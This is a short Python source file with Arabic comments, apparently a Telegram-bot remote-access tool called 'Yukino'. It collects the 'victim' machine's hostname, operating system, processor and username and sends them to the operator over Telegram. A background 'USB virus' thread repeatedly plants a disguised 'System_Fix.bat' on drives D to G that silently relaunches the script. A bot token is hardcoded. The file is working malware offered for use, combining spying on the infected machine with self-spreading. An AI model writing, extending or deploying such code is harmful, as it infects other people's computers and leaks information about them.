import telebot
import os
import platform
import socket
import threading
import time

# التوكن الخاص بك
TOKEN = "8060120509:AAHUzbeWow9DAGR1zCAr4YjlIXSiemYWd9g"
bot = telebot.TeleBot(TOKEN)

# --- معلومات الجهاز الضحية ---
def get_system_info():
    info = {
        "اسم الجهاز": socket.gethostname(),
        "النظام": platform.system(),
        "الإصدار": platform.version(),
        "المعالج": platform.processor(),
        "المستخدم": os.getlogin()
    }
    return info

# --- أمر البداية ---
@bot.message_handler(commands=['start'])
def welcome(message):
    sys_info = get_system_info()
    response = (
        f"✅ سيدي غالب، يوكينو استيقظت في نظام جديد!\n\n"
        f"💻 الجهاز: {sys_info['اسم الجهاز']}\n"
        f"👤 المستخدم: {sys_info['المستخدم']}\n"
        f"🖥️ النظام: {sys_info['النظام']}\n\n"
        "أنا جاهزة لتلقي أوامرك السرية."
    )
    bot.reply_to(message, response)

# --- بروتوكول الانتشار (USB Virus) ---
def usb_spreader():
    while True:
        # البحث عن الفلاش ميموري في ويندوز
        for letter in "DEFG":
            path = f"{letter}:\\"
            if os.path.exists(path):
                # إذا وجد فلاش، يزرع نفسه فيه
                try:
                    with open(os.path.join(path, "System_Fix.bat"), "w") as f:
                        f.write("@echo off\nstart pythonw app.py\necho System Updated.")
                except:
                    pass
        time.sleep(30)

# تشغيل الانتشار في خلفية النظام
threading.Thread(target=usb_spreader, daemon=True).start()

# تشغيل البوت
print("Yukino is running...")
bot.infinity_polling()
